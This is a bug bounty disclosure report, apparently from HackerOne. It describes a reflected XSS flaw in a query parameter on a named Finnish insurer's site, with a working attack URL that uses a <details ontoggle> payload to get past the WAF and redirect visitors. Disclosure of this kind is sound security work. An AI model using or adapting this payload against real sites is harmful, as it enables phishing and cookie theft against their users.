    "vulnerability_information": "## Basic report information\n**Summary:** Reflected XSS vulnerability in `https://www.lahitapiola.fi/cs/Satellite.`\n\n**Description:** There exists a reflected XSS vulnerability in `https://www.lahitapiola.fi/cs/Satellite?pagename=TAMaster/FW_BlogAsset/FW_Nav`. Value of query string parameter `rendermode` is not properly escaped when it is output to the page. The web-application-firewall (WAF) seems to mitigate majority of the simplest XSS vectors, but it is possible to bypass the WAF by using `onToggle` event in `<details>` HTML element. The javascript that is used to demonstrate the vulnerability is `location.href=\"https://www.google.com/?q=\"+document.domain`. This demonstrates an open redirect type of vulnerability where user's browser is redirected to the attacker page where the attacker can e.g. perform phishing.\n\n**Domain:** `www.lahitapiola.fi`\n\n## Browsers / Apps Verified In:\n\n  * Firefox version 57.0.3\n\n## Steps To Reproduce:\n\nAccess the attack URL `https://www.lahitapiola.fi/cs/Satellite?pagename=TAMaster/FW_BlogAsset/FW_Nav&rendermode=preview\"><details%20open=true%20ontoggle=%27location.href=\"https://www.google.com/?q=\"%2Bdocument.domain%27><summary>testing</summary></details>`\nBrowser is redirected to `https://www.google.com/?q=www.lahitapiola.fi`.\n\n## Additional material\n\n* N/A\n\n## Related reports, best practices\n\nThis vulnerability is related to the previously reported Oracle Webcenter Sites vulnerabilities (e.g. #170532)\n\n## Impact\n\nAn attacker can use reflected XSS vulnerabilities to inject content to pages served from `www.lahitapiola.fi`. This can be used e.g. for phishing purposes or to e.g. steal cookies from user's browser.",

Value of query string parameter <code>rendermode</code> is not properly escaped when it is output to the page. The web-application-firewall (WAF) seems to mitigate majority of the simplest XSS vectors, but it is possible to bypass the WAF by using <code>onToggle</code> event in <code>&lt;details&gt;</code> HTML element. The javascript that is used to demonstrate the vulnerability is <code>location.href=&quot;https://www.google.com/?q=&quot;+document.domain</code>. This demonstrates an open redirect type of vulnerability where user&#39;s browser is redirected to the attacker page where the attacker can e.g. perform phishing.</p>\n\n<p><strong>Domain:</strong> <code>www.lahitapiola.fi</code></p>\n\n<h2 id=\"browsers-apps-verified-in\">Browsers / Apps Verified In:</h2>\n\n<ul>\n<li>Firefox version 57.0.3</li>\n</ul>\n\n<h2 id=\"steps-to-reproduce\">Steps To Reproduce:</h2>\n\n<p>Access the attack URL <code>https://www.lahitapiola.fi/cs/Satellite?pagename=TAMaster/FW_BlogAsset/FW_Nav&amp;rendermode=preview&quot;&gt;&lt;details%20open=true%20ontoggle=%27location.href=&quot;https://www.google.com/?q=&quot;%2Bdocument.domain%27&gt;&lt;summary&gt;testing&lt;/summary&gt;&lt;/details&gt;</code><br>\nBrowser is redirected to <code>https://www.google.com/?q=www.lahitapiola.fi</code>.</p>\n\n<h2 id=\"additional-material\">Additional material</h2>\n\n<ul>\n<li>N/A</li>\n</ul>\n\n<h2 id=\"related-reports-best-practices\">Related reports, best practices</h2>\n\n<p>This vulnerability is related to the previously reported Oracle Webcenter Sites vulnerabilities (e.g. <a href=\"/reports/170532\">#170532</a>)</p>\n\n<h2 id=\"impact\">Impact</h2>\n\n<p>An attacker can use reflected XSS vulnerabilities to inject content to pages served from <code>www.lahitapiola.fi</code>.
